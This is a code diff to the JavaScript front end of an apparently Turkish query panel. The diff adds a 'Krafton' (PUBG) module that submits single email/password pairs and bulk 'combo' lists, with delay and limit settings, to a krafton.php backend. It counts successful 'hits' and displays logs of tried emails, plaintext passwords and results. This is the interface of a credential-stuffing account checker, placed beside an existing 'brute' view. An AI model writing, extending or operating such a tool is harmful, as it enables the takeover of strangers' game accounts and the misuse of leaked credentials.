@@ -1,5 +1,5 @@
 /* Forex Sorgulama - Uygulama Mantığı */
-
+const KRAFTON = 'krafton.php';
 const API   = 'forexsystem.php';
 const AUTH  = 'auth.php';
 const CHAT  = 'chat.php';
@@ -261,7 +261,29 @@ function openQuery(type) {
   document.getElementById('resultTable').innerHTML = '';
   showView('query');
 }
+function showView(view) {
+  const viewMap = { query:'viewQuery', chat:'viewChat', users:'viewUsers', profile:'viewProfile', settings:'viewSettings', ai:'viewAI', brute:'viewBrute', krafton:'viewKrafton' };
+  Object.values(viewMap).forEach(id => document.getElementById(id)?.classList.add('hidden'));
+  const targetId = viewMap[view];
+  if (targetId) document.getElementById(targetId)?.classList.remove('hidden');
 
+  document.querySelectorAll('.sb-nav .sb-item').forEach(el => el.classList.remove('active'));
+  const navMap = { chat:'navChat', users:'navUsers', ai:'navAI', brute:'navBrute', krafton:'navKrafton' };
+  if (navMap[view]) document.getElementById(navMap[view])?.classList.add('active');
+
+  if (view === 'profile') loadProfile();
+  if (view === 'users') loadUsers();
+  if (view === 'settings') loadAccountInfo();
+  if (view === 'chat') { loadChat(); scrollChatBottom(); }
+  if (view === 'ai') { loadAIHistory(); scrollAIBottom(); }
+  if (view === 'brute') { loadBruteInfo(); }
+  if (view === 'krafton') { loadKraftonLogs(); }
+
+  if (window.innerWidth < 900) {
+    document.getElementById('sidebar')?.classList.remove('open');
+    document.getElementById('overlay')?.classList.remove('active');
+  }
+}
 function resetQuery() {
   const q = QUERIES[CURRENT_QUERY];
   if (!q) return;
@@ -658,7 +680,114 @@ async function runBrute() {
     btn.innerHTML = '🚀 Başlat (Simülasyon)';
   }
 }
+// ═══════════ KRAFTON ═══════════
+async function kraftonSingle() {
+  const email = document.getElementById('kSingleEmail').value.trim();
+  const pass  = document.getElementById('kSinglePass').value;
+  if (!email || !pass) return toast('email/şifre gerekli', 'error');
 
+  const btn = document.getElementById('kSingleBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Deneniyor...';
+
+  try {
+    const fd = new FormData();
+    fd.append('action','single');
+    fd.append('email', email);
+    fd.append('password', pass);
+    const r = await fetch(KRAFTON, { method:'POST', body: fd });
+    const d = await r.json();
+    if (d.success) toast('✔ ' + d.message, 'success');
+    else toast('✘ ' + (d.error || 'başarısız'), 'error');
+  } catch (e) {
+    toast('❌ Bağlantı hatası', 'error');
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '🔎 Tek Giriş Dene';
+  }
+}
+
+async function kraftonCombo() {
+  const content = document.getElementById('kComboContent').value.trim();
+  const delay   = document.getElementById('kComboDelay').value;
+  const max     = document.getElementById('kComboMax').value;
+  if (!content) return toast('combo içeriği gerekli', 'error');
+
+  const btn = document.getElementById('kComboBtn');
+  const wrap = document.getElementById('kResultWrap');
+  const table = document.getElementById('kResultTable');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Çalışıyor...';
+  wrap.classList.add('active');
+  table.innerHTML = '<div class="q-empty"><span class="spinner"></span> İşleniyor...</div>';
+  document.getElementById('kResultCount').textContent = '';
+
+  try {
+    const fd = new FormData();
+    fd.append('action','combo');
+    fd.append('content', content);
+    fd.append('delay', delay);
+    fd.append('max', max);
+    const r = await fetch(KRAFTON, { method:'POST', body: fd });
+    const d = await r.json();
+    if (!d.success) {
+      table.innerHTML = `<div class="q-error">✗ ${esc(d.error)}</div>`;
+      return;
+    }
+    document.getElementById('kResultCount').textContent = `${d.denenen} deneme · ${d.hit} hit`;
+    if (!d.sonuclar.length) { table.innerHTML = '<div class="q-empty">Sonuç yok</div>'; return; }
+
+    let html = '<table class="q-table"><thead><tr><th>#</th><th>Email</th><th>Durum</th><th>Mesaj</th></tr></thead><tbody>';
+    let i = 1;
+    for (const s of d.sonuclar) {
+      html += `<tr>
+        <td>${i++}</td>
+        <td>${esc(s.email)}</td>
+        <td>${s.success ? '✅' : '❌'} ${esc(s.status)}</td>
+        <td>${esc(s.message)}</td>
+      </tr>`;
+    }
+    html += '</tbody></table>';
+    table.innerHTML = html;
+  } catch (e) {
+    table.innerHTML = '<div class="q-error">✗ Bağlantı hatası</div>';
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '🚀 Combo Başlat';
+  }
+}
+
+async function loadKraftonLogs() {
+  try {
+    const r = await fetch(KRAFTON + '?action=log');
+    const d = await r.json();
+    if (!d.success) return;
+    const wrap = document.getElementById('kResultWrap');
+    const table = document.getElementById('kResultTable');
+    wrap.classList.add('active');
+    document.getElementById('kResultCount').textContent = d.logs.length + ' kayıt';
+    if (!d.logs.length) { table.innerHTML = '<div class="q-empty">Kayıt yok</div>'; return; }
+    let html = '<table class="q-table"><thead><tr><th>Tip</th><th>Email</th><th>Şifre</th><th>Durum</th><th>Tarih</th></tr></thead><tbody>';
+    for (const l of d.logs) {
+      html += `<tr>
+        <td>${esc(l.target)}</td>
+        <td>${esc(l.email)}</td>
+        <td>${esc(l.password)}</td>
+        <td>${l.success ? '✅' : '❌'} ${esc(l.status)}</td>
+        <td>${new Date(l.ts*1000).toLocaleString('tr-TR')}</td>
+      </tr>`;
+    }
+    html += '</tbody></table>';
+    table.innerHTML = html;
+  } catch (e) {}
+}
+
+async function clearKraftonLogs() {
+  if (!confirm('pubg logu temizlensin mi?')) return;
+  await fetch(KRAFTON + '?action=clear');
+  loadKraftonLogs();
+  toast('Temizlendi', 'success');
+}
 async function loadBruteLogs() {
   try {
     const r = await fetch(BRUTE + '?action=log');
